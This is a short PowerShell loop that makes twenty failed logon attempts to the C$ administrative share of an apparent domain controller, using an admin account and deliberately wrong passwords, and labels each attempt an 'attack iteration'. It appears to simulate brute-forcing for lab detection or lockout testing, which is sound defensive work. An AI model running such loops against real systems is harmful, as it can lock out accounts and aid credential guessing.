for ($i = 1; $i -le 20; $i++) {
    net use \\192.168.0.63\C$ /user:kiamsolutions.local\adm-jbutler "BadPassWord_$i"
    Write-Host "Dropped attack iteration $i/20 on Domain Controller" -ForegroundColor Red
}